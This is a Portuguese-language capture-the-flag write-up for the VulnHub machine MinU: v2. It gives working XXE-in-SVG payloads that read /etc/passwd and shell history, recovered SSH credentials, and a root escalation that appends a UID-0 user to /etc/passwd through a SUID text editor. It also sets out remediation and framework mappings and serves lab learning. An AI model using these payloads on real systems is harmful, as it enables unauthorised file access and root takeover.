# MinU: v2 — O SVG que Morde de Volta

Mano, quem diria que um formulário de upload de SVG poderia entregar o box inteiro? MinU: v2 é uma máquina de nível iniciante lindamente construída que encadeia injeção XXE via SVG, vazamento de credenciais pelo histórico do shell, e um editor de texto com SUID para virar root. Sem drama na porta 80 aqui: o servidor web roda na porta 3306 (sim, a porta padrão do MySQL). Isso já é uma pista de que a máquina está te trollando desde o começo. Design legitimamente criativo, gg pro autor.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | MinU: v2 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/minu-v2,333/ |
| **Técnicas** | XXE via upload SVG, vazamento de credenciais por histórico de shell, abuso de binário SUID (editor micro), injeção em /etc/passwd |
| **CVEs** | CWE-611 (Restrição Imprópria de Referência a Entidade Externa XML), CWE-732 (Atribuição Incorreta de Permissão para Recurso Crítico), CWE-522 (Credenciais Insuficientemente Protegidas) |
| **Grupos APT** | APT41 (Winnti Group): usa XXE em aplicações web para leitura de arquivos antes de movimentação lateral; FIN7: explora endpoints de upload mal configurados como vetor de acesso inicial |

---

## Resumo do Ataque

```
netdiscover → nmap → porta 22 (SSH) + porta 3306 (HTTP)
  → dirb na :3306 → formulário de upload SVG descoberto
  → XXE via SVG malicioso → leitura de /etc/passwd → usuário: employee
  → XXE → leitura de /.ash_history → employee:superultrapass3
  → SSH como employee
  → busca SUID → /usr/bin/micro (editor de texto)
  → openssl passwd → hash gerado
  → micro escreve em /etc/passwd → injeção de usuário UID-0
  → su test → id=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e enumeração de serviços (portas 22 + 3306)
2. Brute-force de diretórios web na :3306
3. Injeção XXE via upload SVG para ler /etc/passwd
4. Segundo payload XXE para ler /.ash_history e extrair credenciais
5. Login SSH como employee
6. Enumeração de SUID: /usr/bin/micro identificado
7. Injetar usuário root-equivalente em /etc/passwd via SUID micro
8. Mudar para usuário injetado, ler flag root

---

## Passo 1 — Descoberta de Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
3306/tcp open  http    (não é MySQL - servidor web na porta padrão do MySQL)
```

O servidor web intencionalmente roda na porta 3306. Scanners que assumem 3306 como MySQL vão perder isso completamente. Sem serviço na porta 80 aqui: o atacante precisa escanear todas as portas.

**Nota real:** Serviços em portas não-padrão são uma tática trivial de evasão vista em malware e infraestrutura de atacantes. Sempre escaneie o range completo de portas: `nmap -p- --min-rate 5000`.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Diretórios Web

```bash
dirb http://192.168.1.101:3306 -X .html
```

Uma única página HTML é encontrada com um formulário de upload de arquivo SVG. O formulário aceita apenas arquivos `.svg`. Esta é a superfície de ataque, mano.

**Alternativa:** `gobuster dir -u http://192.168.1.101:3306 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt -t 30`

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — XXE via Upload SVG: Leitura do /etc/passwd

SVG é um formato baseado em XML. Se o servidor analisa SVG com resolução de entidade externa habilitada, um payload XXE embutido no SVG vai causar a leitura de arquivos locais.

Crie um SVG malicioso com payload XXE mirando /etc/passwd:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Salve como `xxe.svg`, faça upload pelo formulário e veja o código-fonte da página de resposta. O conteúdo de /etc/passwd é renderizado dentro do elemento de texto SVG, revelando usuários incluindo `employee`.

**Por que funciona:** O servidor analisa o SVG, resolve a entidade externa `&xxe;` lendo `file:///etc/passwd` e inclui o conteúdo na resposta. É CWE-611, injeção de Entidade Externa XML. Caramba, top demais essa técnica.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — XXE via Upload SVG: Leitura do Histórico do Shell

O alvo roda Alpine Linux, que usa `/bin/ash`. O arquivo de histórico do shell é `/.ash_history` (não `~/.bash_history`). Atualize o payload XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///.ash_history">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <text x="10" y="20">&xxe;</text>
</svg>
```

Faça upload de `history.svg`. O histórico do shell revela credenciais digitadas diretamente na linha de comando:

```
employee:superultrapass3
```

**Nota real:** Arquivos de histórico de shell são minas de ouro, véi. Credenciais inseridas como argumentos de linha de comando ficam gravadas permanentemente. Qualquer XXE, LFI ou SSRF que leia arquivos arbitrários vai expor isso.

**MITRE ATT&CK:** T1552.003 — Credenciais em Arquivos: Histórico Bash

---

## Passo 5 — Login SSH como employee

```bash
ssh employee@192.168.1.101
# Senha: superultrapass3
```

Shell obtido como `employee`. Enumeração básica:

```bash
id
# uid=1001(employee) gid=1001(employee)
sudo -l
# (nada interessante ou sem sudo)
```

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 6 — Enumeração SUID: Editor de Texto micro

```bash
find / -perm -u=s -type f 2>/dev/null
```

A saída inclui `/usr/bin/micro`: um editor de texto moderno com o bit SUID definido. O bit SUID significa que o binário roda com as permissões do proprietário (root). Um editor de texto com SUID root pode escrever em qualquer arquivo, incluindo /etc/passwd.

```bash
ls -la /usr/bin/micro
# -rwsr-xr-x 1 root root ... /usr/bin/micro
```

**MITRE ATT&CK:** T1548.001 — Abuso de Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 7 — Injetar Usuário Root via SUID micro

Gere um hash de senha na vítima ou na máquina atacante:

```bash
openssl passwd -1 -salt user3 pass123
# Saída: $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Use o editor SUID micro para adicionar um novo usuário UID-0 ao /etc/passwd:

```bash
# Abra /etc/passwd no micro (SUID: roda como root)
/usr/bin/micro /etc/passwd
# No editor, navegue até o final do arquivo
# Adicione: test:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/ash
# Salvar: Ctrl+S  |  Sair: Ctrl+Q
```

Mude para o usuário root injetado:

```bash
su test
# Senha: pass123
id
# uid=0(root) gid=0(root) groups=0(root)
```

**MITRE ATT&CK:** T1136.001 — Criar Conta: Conta Local; T1548 — Abuso de Mecanismo de Controle de Elevação

---

## Passo 8 — Flag Root

```bash
cd /root
cat flag.txt
```

Flag capturada. Bora rapaziada, sensacional! (❍ᴥ❍ʋ)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | employee:superultrapass3 | /.ash_history via XXE | Login SSH |
| Usuário root (injetado) | test:pass123 | /etc/passwd (escrito via SUID micro) | su para root |
| Flag root | (conteúdo de /root/flag.txt) | /root/flag.txt | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | XXE via upload SVG lê arquivos locais arbitrários | SVG é XML: qualquer parser que processa SVG sem desabilitar entidades externas é vulnerável. Apps enterprise (conversores de documentos, processadores de imagem) frequentemente caem nessa | Desabilite resolução de entidade externa: `LIBXML_NOENT` desligado, `libxml_disable_entity_loader(true)` no PHP |
| 2 | Histórico do shell contém credenciais em texto claro | Devs e admins rotineiramente digitam senhas como argumentos CLI; isso é gravado permanentemente | Nunca passe credenciais como argumentos CLI; use arquivos de ambiente, vaults ou entrada baseada em prompt |
| 3 | Bit SUID em editor de texto concede acesso de escrita root | Qualquer editor de texto, interpretador ou utilitário de cópia de arquivo com SUID root é um caminho trivial de escalonamento | Audite todos os binários SUID: `find / -perm -4000 -type f 2>/dev/null`; remova SUID de binários não essenciais |
| 4 | Servidor web em porta não-padrão evade scans básicos | Atacantes e defensores perdem serviços quando escaneiam apenas portas padrão | Sempre escaneie todas as 65535 portas: `nmap -p- --min-rate 5000` |
| 5 | Alpine usa /bin/ash e /.ash_history | Investigadores forenses dependendo de caminhos específicos do bash perdem artefatos no Alpine, BusyBox e outras distribuições Linux embarcadas | Conheça o shell do SO alvo; enumere histórico de shell para todos os shells no box |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (XXE) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (histórico de shell) | T1552.003 |
| Movimento Lateral | Contas Válidas | Contas Válidas (SSH com credenciais) | T1078 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Setuid | T1548.001 |
| Persistência | Persistência | Criar Conta: Conta Local | T1136.001 |
| Evasão de Defesa | Evasão de Defesa | Porta Não-Padrão (3306 como HTTP) | T1571 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Desabilite XXE no parser SVG**: defina `LIBXML_NONET | LIBXML_NOENT` no PHP; use `javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING` no Java; configure o parser para proibir declarações DOCTYPE
2. **Restrinja histórico do shell**: defina `HISTFILE=/dev/null` ou `HISTSIZE=0` durante operações privilegiadas; use `unset HISTFILE` para sessões sensíveis; aplique entrada de credenciais via prompts ou gerenciadores de senha
3. **Remova SUID do micro**: `sudo chmod u-s /usr/bin/micro`; audite todos os binários SUID com `find / -perm -4000 -type f 2>/dev/null` regularmente
4. **Execute o serviço web como usuário sem privilégios**: o processo web não deve ter acesso de leitura a /home, /root, ou arquivos de histórico de shell
5. **Mova o serviço web para uma porta padrão**: a confusão com a porta 3306 ajuda atacantes a evadir padrões de scanner; use segregação adequada de portas

### Contramedidas MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação: desabilite resolução de entidade externa em todos os parsers XML
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional: audite e remova bits SUID de binários não essenciais
- **D3-HBPI** — Fortalecer Integridade do Pipeline de Build: previna que credenciais sejam incorporadas no histórico de shell durante processos CI/CD

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os endpoints de upload web; catalogar binários SUID em todos os hosts |
| Proteger | Segurança de Dados | Desabilitar XXE em parsers XML; rotacionar credenciais se expostas via histórico de shell |
| Proteger | Controle de Acesso | Remover SUID de binários não essenciais; restringir usuário do serviço web a permissões mínimas |
| Detectar | Anomalias e Eventos | Alertar sobre execução de binário SUID por usuários não-root; monitorar eventos de modificação do /etc/passwd |
| Responder | Planejamento de Resposta | Remover entradas maliciosas injetadas em /etc/passwd; rotacionar credenciais expostas via XXE |
| Recuperar | Planejamento de Recuperação | Reconstruir host comprometido; auditar todas as contas para entradas UID-0 não autorizadas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-3 | Proteção contra Código Malicioso | Escaneie arquivos enviados para conteúdo malicioso antes de processar |
| AC-6 | Menor Privilégio | Remova SUID de editores de texto; restrinja usuário do serviço web |
| IA-5 | Gerenciamento de Autenticador | Rotacione todas as credenciais expostas via vulnerabilidades de leitura de arquivo |
| CM-7 | Funcionalidade Mínima | Desabilite resolução de entidade externa; limite tipos de arquivo enviados |
| AU-9 | Proteção de Informações de Auditoria | Proteja arquivos de histórico de shell de leituras acessíveis pela web |
| SC-28 | Proteção de Informações em Repouso | Restrinja /etc/passwd e histórico de shell para leitura apenas pelo root |

### CISA KEV

Vulnerabilidades XXE (CWE-611) estão consistentemente presentes nas entradas do catálogo de Vulnerabilidades Exploradas Conhecidas da CISA para aplicações web empresariais. CISA AA21-259A e AA22-074A referenciam leitura de arquivo via XXE como técnica de acesso inicial usada por atores de estado-nação. Organizações devem corrigir parsers XML e desabilitar resolução de entidade externa como remediação prioritária.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativo, Mudança e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT (auditoria SUID) | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios (remover SUID de editores) | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade (scan XXE) | MIL2 |

---

## Considerações Finais

MinU: v2 é uma obra-prima em encadeamento de primitivas. Cada passo é modesto sozinho: ler um arquivo, encontrar uma senha no histórico, abusar de um editor SUID. Mas juntos formam uma kill chain limpa e ensinável que espelha intrusões do mundo real.

O SVG como vetor XXE é uma técnica genuinamente subestimada. A maioria dos desenvolvedores pensa em "SVG" e pensa em imagens, não em parsers XML. A máquina merece sua badge "v2" por manter a superfície de ataque estreita e forçar precisão em vez de spray-and-pray.

Props pro autor pela jogada Alpine: encontrar credenciais em `/.ash_history` em vez de `~/.bash_history` é o tipo de detalhe que separa um CTF bom de um ótimo. Sensacional demais, véi.

Thanks guys!! (❍ᴥ❍ʋ)
